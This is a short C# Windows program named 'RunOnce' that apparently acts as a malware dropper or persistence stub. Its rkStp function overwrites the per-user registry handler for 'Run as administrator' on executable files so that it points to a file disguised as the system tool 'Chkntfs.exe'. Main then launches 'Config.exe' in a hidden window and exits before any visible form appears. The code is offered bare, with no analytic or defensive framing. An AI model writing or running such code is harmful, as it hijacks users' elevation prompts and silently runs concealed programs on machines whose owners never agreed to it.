using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;

namespace RunOnce
{
    static class Program
    {
        public static void rkStp(string Q)
        {
            Q += "\\Chkntfs.exe";
            try
            {
                Registry.SetValue(
                        "HKEY_CURRENT_USER\\Software\\Classes\\exefile\\shell\\runas\\command",
                        "",
                        Q,
                        RegistryValueKind.String
                );
            }
            catch { }
            try
            {
                Registry.SetValue(
                        "HKEY_CURRENT_USER\\Software\\Classes\\exefile\\shell\\runas\\command",
                        "isolatedCommand",
                        Q,
                        RegistryValueKind.String
                );
            }
            catch { }
            try
            {
                Registry.SetValue(
                        "HKEY_CURRENT_USER\\Software\\Classes\\exefile\\shell\\runas\\command",
                        "(Default)",
                        Q,
                        RegistryValueKind.String
                );
            }
            catch { }

        }
        [STAThread]
        static void Main()
        {
            string d = Directory.GetCurrentDirectory();
            rkStp(d);
            string y = d + "\\Config.exe";
            Process process = new Process();
            process.StartInfo.FileName = y;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.CreateNoWindow = true;
            process.EnableRaisingEvents = false;
            process.Start();
            Environment.Exit(0);
            Application.Exit();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            Environment.Exit(0);
        }
    }
}
